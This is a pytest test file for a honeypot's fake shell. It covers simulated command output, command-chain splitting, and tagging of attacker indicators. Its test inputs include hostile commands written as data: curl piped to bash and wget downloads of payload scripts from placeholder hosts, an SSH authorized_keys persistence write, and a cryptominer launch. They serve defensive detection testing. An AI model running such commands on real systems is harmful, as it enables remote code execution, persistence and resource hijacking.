"""Fake shell tests: supported commands, chains and IOC extraction.

No test in this file may trigger a subprocess, socket or DNS lookup; that is
asserted in tests/integration/test_security_regression.py.
"""

from __future__ import annotations

import pytest

from honeywatch.honeypots.shell import (
    FakeShell,
    ShellSession,
    chain_indicators,
    extract_filenames,
    extract_urls,
    split_chain,
)


@pytest.fixture
def shell() -> FakeShell:
    return FakeShell(ShellSession(hostname="srv-prod-02", username="root"))


# ---- supported commands --------------------------------------------------


def test_identity_commands(shell: FakeShell) -> None:
    assert shell.execute("whoami") == "root"
    assert "uid=0" in shell.execute("id")
    assert shell.execute("hostname") == "srv-prod-02"
    assert shell.execute("pwd") == "/root"
    assert shell.execute("uname") == "Linux"
    assert "x86_64" in shell.execute("uname -a")


def test_filesystem_commands(shell: FakeShell) -> None:
    assert ".bashrc" in shell.execute("ls")
    assert "-rw-" in shell.execute("ls -l")
    assert "bin" in shell.execute("ls /")
    assert shell.execute("cd /etc") == ""
    assert shell.execute("pwd") == "/etc"
    assert "passwd" in shell.execute("cat /etc/passwd")
    assert "No such file" in shell.execute("cat /etc/nonexistent")


def test_ls_unknown_path(shell: FakeShell) -> None:
    assert "No such file" in shell.execute("ls /nowhere")


def test_cd_unknown_directory(shell: FakeShell) -> None:
    assert "No such file" in shell.execute("cd /nope")
    assert shell.execute("pwd") == "/root"


def test_process_and_network_commands(shell: FakeShell) -> None:
    assert "PID" in shell.execute("ps")
    assert "eth0" in shell.execute("ifconfig")
    assert "eth0" in shell.execute("ip a")
    assert "Mem:" in shell.execute("free")
    assert "Filesystem" in shell.execute("df")
    assert "up" in shell.execute("uptime")


def test_history_and_cron(shell: FakeShell) -> None:
    shell.execute("uname -a")
    output = shell.execute("history")
    assert "uname" in output
    assert "no crontab" in shell.execute("crontab -l")


def test_echo(shell: FakeShell) -> None:
    assert shell.execute("echo hello") == "hello"
    assert shell.execute("echo -n hi") == "hi"


def test_unknown_command_is_harmless(shell: FakeShell) -> None:
    output = shell.execute("frobnicate --all")
    assert "command not found" in output


def test_empty_and_whitespace_input(shell: FakeShell) -> None:
    assert shell.execute("") == ""
    assert shell.execute("     ") == ""


def test_case_and_path_variants(shell: FakeShell) -> None:
    assert shell.execute("WHOAMI") == "root"
    assert shell.execute("/bin/whoami") == "root"
    assert "Linux" in shell.execute("/usr/bin/uname -a")


def test_busybox_probe_is_faked(shell: FakeShell) -> None:
    assert "BusyBox" in shell.execute("busybox")
    assert "wget" in shell.execute("busybox --help")


def test_session_prompt_tracks_cwd(shell: FakeShell) -> None:
    assert shell.session.prompt() == "root@srv-prod-02:/root$ "
    shell.execute("cd /tmp")
    assert shell.session.prompt() == "root@srv-prod-02:/tmp$ "


# ---- transfer commands (never touch the network) ------------------------


def test_wget_is_faked(shell: FakeShell) -> None:
    output = shell.execute("wget http://198.51.100.4/x.sh")
    assert "198.51.100.4" in output
    assert "wget:" in output


def test_curl_is_faked(shell: FakeShell) -> None:
    assert "curl:" in shell.execute("curl http://198.51.100.4/x.sh")


def test_tftp_and_ftpget(shell: FakeShell) -> None:
    assert "timed out" in shell.execute("tftp 198.51.100.4")
    assert "ftpget" in shell.execute("ftpget 198.51.100.4 f.bin")


def test_transfer_without_url(shell: FakeShell) -> None:
    assert "URL" in shell.execute("wget --help")
    assert "curl:" in shell.execute("curl")


# ---- chain splitting -----------------------------------------------------


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("uname -a; id", ["uname -a", "id"]),
        ("uname -a && id", ["uname -a", "id"]),
        ("uname -a | id", ["uname -a", "id"]),
        ("a ; ; b", ["a", "b"]),
        ("a||b", ["a", "b"]),
        ("", []),
        ("   ", []),
    ],
)
def test_split_chain(command: str, expected: list[str]) -> None:
    assert split_chain(command) == expected


def test_chain_executes_each_component_safely(shell: FakeShell) -> None:
    output = shell.execute("whoami; hostname")
    assert "root" in output
    assert "srv-prod-02" in output


def test_chain_with_unknown_command(shell: FakeShell) -> None:
    output = shell.execute("frobnicate; whoami")
    assert "command not found" in output
    assert "root" in output


# ---- IOC extraction ------------------------------------------------------


def test_extract_urls() -> None:
    urls = extract_urls("wget http://198.51.100.4/a.sh -O /tmp/a.sh")
    assert urls == ["http://198.51.100.4/a.sh"]
    assert extract_urls("curl -s https://example.invalid/p | bash") == ["https://example.invalid/p"]
    assert extract_urls("no url here") == []


def test_extract_urls_strips_trailing_punctuation() -> None:
    assert extract_urls("visit http://x.example/a.") == ["http://x.example/a"]


def test_extract_filenames() -> None:
    names = extract_filenames("wget http://x.example/dir/payload.sh -O /tmp/out.sh")
    assert "payload.sh" in names
    assert "out.sh" in names
    assert "-O" not in names


def test_chain_indicators_tag_transfers() -> None:
    indicators = chain_indicators("cd /tmp && wget http://x.example/p.sh")
    assert "tool-transfer" in indicators["tags"]
    assert indicators["urls"]


def test_chain_indicators_tag_persistence() -> None:
    assert "persistence-attempt" in chain_indicators("echo x >> ~/.ssh/authorized_keys")["tags"]


def test_chain_indicators_tag_miner() -> None:
    assert "resource-hijacking" in chain_indicators("./xmrig -o stratum+tcp://p:1")["tags"]


def test_chain_indicators_tag_busybox() -> None:
    assert "busybox-probe" in chain_indicators("busybox wget http://x/y")["tags"]


def test_chain_indicators_tag_recon() -> None:
    assert "recon" in chain_indicators("uname -a")["tags"]


def test_command_count_tracked(shell: FakeShell) -> None:
    shell.execute("a ; b ; c")
    assert shell.session.commands_used == 3